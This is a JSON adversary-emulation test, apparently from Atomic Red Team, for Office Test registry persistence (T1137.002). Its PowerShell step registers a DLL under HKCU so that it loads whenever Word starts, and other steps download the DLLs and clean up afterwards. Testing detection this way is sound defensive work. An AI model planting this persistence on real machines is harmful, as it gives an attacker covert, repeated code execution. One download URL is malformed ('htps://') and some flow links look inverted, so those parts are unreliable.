{
  "id": "c3e35b58-fe1c-480b-b540-7600fb612563",
  "name": "Office Application Startup Test Persistence (HKCU)",
  "description": "Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office\napplication is started. Key is used for debugging purposes. Not created by default \u0026 exist in HKCU \u0026 HKLM hives.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "bf6e7ec7-ea4b-4ef1-b66a-7cd8491c0a68",
      "type": "execute-command",
      "data": {
        "command": "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\" /f       \n}\nelse{\n  Write-Host \"32-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\" /f\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\"\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "fc26c8b5-1684-4f69-ba0a-2709915f4aff",
      "type": "execute-command",
      "data": {
        "command": "Stop-Process -Name \"notepad\",\"WinWord\" -ErrorAction Ignore\nRemove-Item \"HKCU:\\Software\\Microsoft\\Office test\\Special\\Perf\" -ErrorAction Ignore",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "fe95de86-5fd9-4b1c-98c1-44b6f7d4f14c",
      "name": "Check dependency 1/2",
      "description": "Microsoft Word must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "9781e70c-36bc-4131-a84f-d89f503d864a",
      "name": "Resolve dependency 1/2",
      "description": "Microsoft Word must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "5c014322-f23c-49dc-9630-050bc07f011e",
      "name": "Re-check dependency 1/2",
      "description": "Microsoft Word must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "15ecefae-f2a0-4279-bfaf-c01193df9800",
      "name": "Check dependency 2/2",
      "description": "DLL files must exist on disk at specified location",
      "type": "execute-command",
      "data": {
        "command": "if ((Test-Path \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\")) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "7d08b689-58b0-421d-972f-989674e15283",
      "name": "Resolve dependency 2/2",
      "description": "DLL files must exist on disk at specified location",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.002\\bin\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.002/bin/officetest_x64.dll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\"\nInvoke-Webrequest -Uri \"htps://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.002/bin/officetest_x86.dll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\"",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "a0864b7a-a471-4c91-8a57-bff4688a1dd6",
      "name": "Re-check dependency 2/2",
      "description": "DLL files must exist on disk at specified location",
      "type": "execute-command",
      "data": {
        "command": "if ((Test-Path \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\")) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "bf6e7ec7-ea4b-4ef1-b66a-7cd8491c0a68",
      "p": "on-success",
      "o": "fc26c8b5-1684-4f69-ba0a-2709915f4aff"
    },
    {
      "s": "bf6e7ec7-ea4b-4ef1-b66a-7cd8491c0a68",
      "p": "on-failure",
      "o": "fc26c8b5-1684-4f69-ba0a-2709915f4aff"
    },
    {
      "s": "fe95de86-5fd9-4b1c-98c1-44b6f7d4f14c",
      "p": "on-success",
      "o": "bf6e7ec7-ea4b-4ef1-b66a-7cd8491c0a68"
    },
    {
      "s": "fe95de86-5fd9-4b1c-98c1-44b6f7d4f14c",
      "p": "on-failure",
      "o": "9781e70c-36bc-4131-a84f-d89f503d864a"
    },
    {
      "s": "9781e70c-36bc-4131-a84f-d89f503d864a",
      "p": "on-success",
      "o": "5c014322-f23c-49dc-9630-050bc07f011e"
    },
    {
      "s": "5c014322-f23c-49dc-9630-050bc07f011e",
      "p": "on-failure",
      "o": "bf6e7ec7-ea4b-4ef1-b66a-7cd8491c0a68"
    },
    {
      "s": "15ecefae-f2a0-4279-bfaf-c01193df9800",
      "p": "on-success",
      "o": "bf6e7ec7-ea4b-4ef1-b66a-7cd8491c0a68"
    },
    {
      "s": "15ecefae-f2a0-4279-bfaf-c01193df9800",
      "p": "on-failure",
      "o": "7d08b689-58b0-421d-972f-989674e15283"
    },
    {
      "s": "7d08b689-58b0-421d-972f-989674e15283",
      "p": "on-success",
      "o": "a0864b7a-a471-4c91-8a57-bff4688a1dd6"
    },
    {
      "s": "a0864b7a-a471-4c91-8a57-bff4688a1dd6",
      "p": "on-failure",
      "o": "bf6e7ec7-ea4b-4ef1-b66a-7cd8491c0a68"
    }
  ],
  "tags": [
    "T1137.002",
    "atomic-red-team"
  ]
}